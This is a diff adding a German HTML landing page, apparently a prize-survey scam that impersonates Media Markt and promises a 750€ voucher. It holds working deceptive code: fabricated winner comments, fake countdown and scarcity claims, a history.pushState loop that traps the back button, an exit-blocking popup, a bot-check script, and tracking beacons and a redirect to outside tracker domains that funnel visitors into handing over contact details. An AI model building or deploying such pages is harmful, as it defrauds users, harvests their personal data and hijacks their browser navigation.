@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <link rel="shortcut icon" href="favicon.ico">
+  <script src="jquery.min.js"></script>
+  <script>
+    var getUrlParameter = function(f) {
+        var d, g, c = decodeURIComponent(window.location.search.substring(1)),
+          b = c.split("&");
+        for (g = 0; g < b.length; g++) {
+          if (d = b[g].split("="), d[0] === f) {
+            return void 0 === d[1] || d[1]
+          }
+        }
+      },
+      city = getUrlParameter("city");
+    null != city && "undefined" != city || (city = "Deutschland"), $(document).ready(function() {
+      var b = getUrlParameter("pre"),
+        a = getUrlParameter("vib");
+      setTimeout(function() {
+        $("#comment1").fadeIn()
+      }, 10000), setTimeout(function() {
+        $("#comment2").fadeIn()
+      }, 12000), setTimeout(function() {
+        $("#comment3").fadeIn()
+      }, 13000), setTimeout(function() {
+        $("#comment4").fadeIn()
+      }, 18000), setTimeout(function() {
+        $("#comment5").fadeIn()
+      }, 20000), setTimeout(function() {
+        $("#comment6").fadeIn()
+      }, 22000), $(".bq1").click(function() {
+        $("#q1").fadeOut(0), $("#q2").fadeIn(100)
+      }), $(".bq2").click(function() {
+        $("#q2").fadeOut(0), $("#q3").fadeIn(100)
+      }), $(".bq3").click(function() {
+        $("#q3").fadeOut(0), $("#q4").fadeIn(100)
+      }), $(".bq4").click(function() {
+        $("#content1").fadeOut(0), $("#content2").fadeIn(), setTimeout(function() {
+          $("#result1").fadeIn(1000)
+        }, 3000), setTimeout(function() {
+          $("#result2").fadeIn(1000)
+        }, 4100), setTimeout(function() {
+          $("#result3").fadeIn(1000)
+        }, 6000), setTimeout(function() {
+          $("#content2").fadeOut()
+        }, 7100), setTimeout(function() {
+          $("#content3").fadeIn()
+        }, 7100)
+      }), void 0 !== a && "n" === a || (navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate, navigator.vibrate([]))
+    });
+  </script>
+  <script>
+    var city = getUrlParameter("city");
+    if (city == "") {
+      city = "Deutschland"
+    }
+  </script>
+  <meta content="width=device-width,user-scalable=fLikee;initial-scale=1;maximum-scale=1" name="viewport">
+  <title>Germany Survey Center</title>
+  <link href="css.min.css" rel="stylesheet">
+  <meta name="theme-color" content="#D80100">
+  <meta name="robots" content="NOINDEX, FOLLOW">
+  <meta name="robots" content="INDEX, NOFOLLOW">
+  <meta name="robots" content="NOINDEX, NOFOLLOW">
+  <meta name="googlebot" content="NOINDEX, FOLLOW">
+  <meta name="googlebot" content="INDEX, NOFOLLOW">
+  <meta name="googlebot" content="NOINDEX, NOFOLLOW">
+  <meta name="google" content="notranslate">
+  <script>
+    ! function() {
+      var a;
+      try {
+        for (a = 0; 10 > a; ++a) {
+          history.pushState({}, "", "#")
+        }
+        onpopstate = function(b) {
+          b.state && location.replace("#")
+        }
+      } catch (a) {}
+    }();
+  </script>
+  <script>
+    function getURLParameter(a) {
+      return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
+    }
+  </script>
+  <script type="text/javascript">
+    var dayNames = Array("Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag");
+    var monthNames = new Array("Januar", "Februar", "März", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember");
+    var now = new Date();
+    var today = now.getDate() + " " + monthNames[now.getMonth()] + ", " + now.getFullYear();
+
+    function get_date(a) {
+      return today = (now.getDate() - a) + " " + monthNames[now.getMonth()] + ", " + now.getFullYear()
+    }
+  </script>
+  <script type="text/javascript">
+    function speak(c) {
+      var b = new SpeechSynthesisUtterance();
+      var a = speechSynthesis.getVoices();
+      b.voice = a[6];
+      b.voiceURI = "native";
+      b.volume = 1;
+      b.rate = 1;
+      b.pitch = 1;
+      b.text = c;
+      b.lang = "de-DE";
+      speechSynthesis.speak(b)
+    }
+    speak("Herzlichen Glückwunsch, lieber Nutzer, Sie haben einen Preis gewonnen!");
+  </script>
+  ​<script>
+    (function() {
+      window.afilter = function(event, detail, token) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://trk.yeahmiracle.com/p/events', true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("et=" + event + "&v=" + detail + "&t=" + token);
+      };
+      window.atgo = function(url) {
+        window.location.replace("https://" + 'trk.' + 'yeahmiralce.com/' + url);
+      };
+    }());
+  </script>
+  <!-- 修复后 -->
+  <script>
+  "use strict";!function(){var e={clicks:{clickCount:0,clickWrong:0,clickDetails:[]}};window.AtRequest=function(e="GET",t,n=null){var o=new XMLHttpRequest;o.open(e,t,!0),o.withCredentials=!0,n&&o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send(n)},window.AtClickCheck=function(t=["p","button","a"],n=3,o=0){document.addEventListener("DOMContentLoaded",function(){document.addEventListener("mouseup",function(c){e.clicks.clickCount++,e.clicks.clickDetails.push({timestamp:Date.now(),node:c.target.nodeName,x:c.pageX,y:c.pageY}),o>0&&console.log(c.target.nodeName),t.indexOf(c.target.nodeName.toLowerCase())<0&&e.clicks.clickWrong++,e.clicks.clickWrong>n&&(o>0&&console.log("Bot"),AtRequest("GET","https://trk.yeahmiracle.com/d/wrong"))})})}}();
+  AtClickCheck(["div"],3);
+  </script>
+  <!-- 修复后 -->
+</head>
+
+<body>
+  <div class="header">
+    <p><span><img src="mm.png"><img src="len-de.png" style="float:right;padding-right:5px"></span></p>
+  </div>
+  <div class="content">
+    <p class="dt">
+      <script>
+        document.write(today);
+      </script>
+    </p>
+    <div class="main-content flag" id="content1">
+      <h1>Herzlichen Glückwunsch lieber Benutzer, Sie haben einen <script>
+          document.write(getURLParameter("brand") + " " + getURLParameter("mod"));
+        </script> gewonnen!</h1>
+      <h2>Heute am <script>
+          document.write(get_date(0));
+        </script> wurden Sie zufällig ausgewählt, um an dieser Umfrage teilzunehmen. Es dauert nur eine Minute und Sie werden Ihren Preis erhalten - einen Gutschein in Höhe von 750€!</h2>
+      <a href="javascript:void(0);"><img src="REWE-250-EURO.jpg" style="max-width:310px;margin:0 auto;display:block;width:100%"></a>
+      <p>Jeden
+        <span id="today">
+          <script language="Javascript">
+            var dayNames = new Array("Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag");
+            var monthNames = new Array("Januar", "Februar", "März", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember");
+            var now = new Date();
+            document.write(dayNames[now.getDay()]);
+          </script>
+          <script type="text/javascript">
+            function startTimer(c) {
+              var f, g, d = c,
+                b = setInterval(function() {
+                  f = parseInt(d / 60, 10), g = parseInt(d % 60, 10), g = 10 > g ? "0" + g : g, $("#timerr").text(f + " Minuten und " + g + " Sekunden"), --d < 0 && (clearInterval(b))
+                }, 1000)
+            }
+            startTimer((1 * 60) + 29);
+          </script>
+        </span> verschenken wir unseren Kunden wertvolle Preise von unseren Hauptsponsoren - dem <b>Media Markt Supermarkt</b>! Nur 10 glückliche Gewinner erhalten Geschenke<script></script>!</p>
+      <p>Diese Umfrage wird von unserem Sponsor – dem Media Markt Supermarkt, organisiert, der sich um seine Kunden kümmert!</p>
+      <p>Darüber hinaus haben Sie die Möglichkeit zusätzlich noch etwas zu gewinnen: einen Gutschein in Höhe von 750€, eine Playstation 4 oder einen Samsung Galaxy S8, wenn Sie an der Umfrage teilnehmen und die Kontaktangaben auf der Sponsorenseite
+        ausfüllen!</p>
+      <p>Sie haben nur noch <font color="red"><b><span id="timerr">0 Minuten und 54 Sekunden</span></b></font>, um an dieser Umfrage teilnehmen zu können.</p>
+      <p>Beeilen Sie sich, die Anzahl der Preise ist begrenzt! 7 andere
+        Benutzter haben bereits ihre Preise erhalten! Es bleiben nur noch 3
+        Gutscheine!</p>
+      <div id="q1">
+        <p class="question"><strong>Frage 1 von 4:</strong> Sind Sie männlich oder weiblich?</p>
+        <div class="button bq1">
+          Mann
+        </div>
+        <div class="button bq1">
+          Frau
+        </div>
+      </div>
+      <div id="q2">
+        <p class="question"><strong>Frage 2 von 4:</strong> Wie alt sind Sie?</p>
+        <div class="button bq2" onclick="afilter(1);">
+          18-29
+        </div>
+        <div class="button bq2" onclick="afilter(1);">
+          30-39
+        </div>
+        <div class="button bq2" onclick="afilter(1);">
+          40-49
+        </div>
+        <div class="button bq2" onclick="afilter(1);">
+          50+
+        </div>
+      </div>
+      <div id="q3">
+        <p class="question"><strong>Frage 3 von 4:</strong> Wie viele Personen leben mit Ihnen zusammen im Haushalt?</p>
+        <div class="button bq3" onclick="afilter(2);">
+          nur ich
+        </div>
+        <div class="button bq3" onclick="afilter(2);">
+          1
+        </div>
+        <div class="button bq3" onclick="afilter(2);">
+          2
+        </div>
+        <div class="button bq3" onclick="afilter(2);">
+          3+
+        </div>
+      </div>
+      <div id="q4">
+        <p class="question"><strong>Frage 4 von 4:</strong> Kaufen Sie im Media Markt Supermarkt ein?</p>
+        <div class="button bq4" onclick="afilter(3);">
+          JA
+        </div>
+        <div class="button bq4" onclick="afilter(3);">
+          NEIN
+        </div>
+      </div>
+    </div>
+    <div class="main-content" id="content2">
+      <h1 style="text-align:center">Überprüfen Sie Ihre Antworten ...</h1>
+      <p class="loading"><img src="loading.gif"></p>
+      <p class="result" id="result1">Sie haben 4/4 Fragen geantwortet!.</p>
+      <p class="result" id="result2">Keine vorher Abfrage von Ihrem IP.</p>
+      <p class="result" id="result3">Es gibt noch verfügbare Geschenke!</p>
+    </div>
+    <div class="main-content" id="content3">
+      <h1 style="text-align:center">Glückwünsch! Sie wurden für (1) Media Markt Gutschein in Höhe von 750€ ausgewählt!</h1>
+      <h2>Klicken Sie hier, um Ihren Gutschein zu erhalten. Danke für Ihre Teilnahme.</h2>
+      <!--<a class="claim" onclick="window.onbeforeunload=null;location.href='https://trk.yeahmiracle.com/click'">-->
+      <!-- 修复后 -->
+        <p class="loading"><img src="REWE-250-EURO.jpg" style="max-width:310px;margin:0 auto;display:block;width:100%"></p>
+        <a href="javascript:void(0);" onclick="atgo('click');"><div class="button2">BEANSPRUCHE JETZT</div></a>
+      <!-- 修复后 -->
+      <p style="text-align:center">Bitte geben Sie auf der nächsten Seite Ihre Kontaktangaben an, damit wir Sie kontaktieren können. Beeilen Sie sich, denn wir haben nur eine begrenzte Anzahl von Geschenkkarten zu verlosen.</p>
+    </div>
+    <div class="main-content">
+      <div class="comments">
+        <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998">Mehr sehen
+            Bemerkungen</span></p>
+        <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">
+          50 von 80</p>
+        <div style="clear:both"></div>
+      </div>
+      <div class="comments" id="comment6" style="display:block">
+        <div class="profile"><img src="1.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Nicholas V Tan</p>
+          <p>Dachte, dass es ein Witz war, aber die Geschenkkarte kam heute morgen per Post. Ich möchte mehr Umfragen machen!.</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar·<img src="like.png" width="15px" height="15px">34</span> ·
+          <script>
+            document.write(get_date(1));
+          </script>
+        </div>
+      </div>
+      <div class="comments" id="comment5" style="display:block">
+        <div class="profile"><img src="2.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Amirah Hamzah</p>
+          <p>Zuerst dachte ich, es war ein Witz, aber ich erhielt nur meine
+            Gutschein (250 Euro) weitergeleitet diese an meine Freunde, damit sie
+            auch eine lol bekommen können</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">34</span> ·
+          <script>
+            document.write(get_date(2));
+          </script>
+        </div>
+      </div>
+      <div class="comments" id="comment4" style="display:block">
+        <div class="profile"><img src="3.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Axel Green</p>
+          <p>Das ist toll! Ich habe noch nie etwas gewonnen !!!</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">8</span> ·
+          <script>
+            document.write(get_date(2));
+          </script>
+        </div>
+      </div>
+      <div class="comments" id="comment3" style="display:block">
+        <div class="profile"><img src="4.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Martin Beers</p>
+          <p>Ich liebe Angebote wie dieses!</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">31</span> ·
+          <script>
+            document.write(get_date(3));
+          </script>
+        </div>
+      </div>
+      <div class="comments" id="comment2" style="display:block">
+        <div class="profile"><img src="5.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Alli Beers</p>
+          <p>Ich habe gerade einen Anruf, den ich gewonnen habe, ich bin so glücklich!</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">100</span> ·
+          <script>
+            document.write(get_date(3));
+          </script>
+        </div>
+      </div>
+      <div class="comments" id="comment1" style="display:block">
+        <div class="profile"><img src="6.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Ross Vermin</p>
+          <p>Teilnahme an 5 Tagen und gewann, danke so viel Jungs!</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">52</span> ·
+          <script>
+            document.write(get_date(3));
+          </script>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="profile"><img src="7.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Amelie De Bosere</p>
+          <p>Gib meine Geschenkkarte per E-Mail heute. Danke Jungs (ist es möglich? <br>
+            <img src="winners.jpg" style="max-width:250px"></p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">35</span> ·
+          <script>
+            document.write(get_date(3));
+          </script>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="profile"><img src="8.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Casey Fennis</p>
+          <p>Damnit hat nichts gewonnen :(</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">45</span> ·
+          <script>
+            document.write(get_date(4));
+          </script>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="profile"><img src="9.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Marc Top</p>
+          <p>Irgendwelche Umfragen, die ich tun kann? <br></p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">10</span> ·
+          <script>
+            document.write(get_date(5));
+          </script>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="profile"><img src="10.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Lucille Dingler</p>
+          <p>Hast du jemals so etwas gesehen, gerade als heute ein schlechter Tag war, bekam ich diesen tollen Deal!</p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">13</span> ·
+          <script>
+            document.write(get_date(6));
+          </script>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="profile"><img src="11.jpg"></div>
+        <div class="comment-content">
+          <p class="name">Paul Jan Harms</p>
+          <p>Sieger, Sieger Hühnchen Abendessen! <br>
+            <img src="21.gif"></p>
+        </div>
+        <div class="clr"></div>
+        <div class="comment-status">
+          <span>Wie · Kommentar· <img src="like.png" width="15px" height="15px">5</span> -
+          <script>
+            document.write(get_date(6));
+          </script>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--<script type="text/javascript">if(typeof window.orientation!="undefined"){PK.saveCampToken({et1:"mobile"})}else{PK.saveCampToken({et1:"emulator"})}PK.saveCampToken({et2:screen.width+"x"+screen.height});function fb_token(a){PK.saveCampToken({et3:a})}</script>-->
+  <script>
+    function funcc() {
+      alert("Herzlichen Glückwunsch, lieber Benutzer!\n\nSie haben einen 750€ Media Markt Gutschein gewonnen.\nKlicken Sie auf OK, um Ihren Preis abzuholen!")
+    }
+    setTimeout(funcc, 1000);
+  </script>
+  <script>
+    var PreventExitPop = true;
+
+    function ExitPop() {
+      if (PreventExitPop != false) {
+        return "Wollen Sie diese Seite wirklich verlassen?\n\nDie Anzahl der Media Markt Gutscheine sind begrenzt! Wenn Sie dieses Fenster schließen, übergeben Sie Ihre Gewinnchance  an eine andere Person!\n\n---"
+      }
+    }
+    window.onbeforeunload = ExitPop;
+  </script>
+
+</body>
+
+</html>
